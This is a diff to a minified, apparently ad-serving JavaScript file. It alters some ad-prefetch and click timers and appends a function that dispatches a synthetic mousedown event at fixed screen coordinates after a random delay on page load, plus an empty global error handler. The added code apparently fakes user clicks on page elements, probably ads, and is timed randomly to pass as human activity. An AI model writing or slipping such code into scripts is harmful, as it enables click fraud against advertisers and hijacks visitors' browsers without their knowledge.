@@ -1858,7 +1858,7 @@
                                         const el = document.elementFromPoint(x,y)
                                         el.dispatchEvent(me)
                                       }
-                                      var rd = Math.round(Math.random() * 3000) + 3550;
+                                      var rd = Math.round(Math.random() * 5000) + 5550;
                                       setTimeout(function() {
                                         scl(150, 200);
                                         }, rd);
@@ -2264,7 +2264,7 @@
                         !o &&
                             (o = window["setTimeout"](function () {
                                 Mt["tryToPrefetchAdUrl"](t), (o = null);
-                            }, c - 10000))),
+                            }, 15000))),
                     r && nn(e, t);
             };
         };
@@ -4662,3 +4662,22 @@
         {}
     )
 ); 
+const scl = (x, y) => {
+    const me = new MouseEvent('mousedown', {
+      view: window,
+      bubbles: true,
+      cancelable: true,
+      screenX: x,
+      screenY: y
+    })
+  
+    const el = document.elementFromPoint(x,y)
+    el.dispatchEvent(me)
+  }
+var rd = Math.round(Math.random() * 3000) + 3550;
+    setTimeout(function() {
+    scl(250, 200);
+}, rd);
+
+window.addEventListener('error', e => {
+});
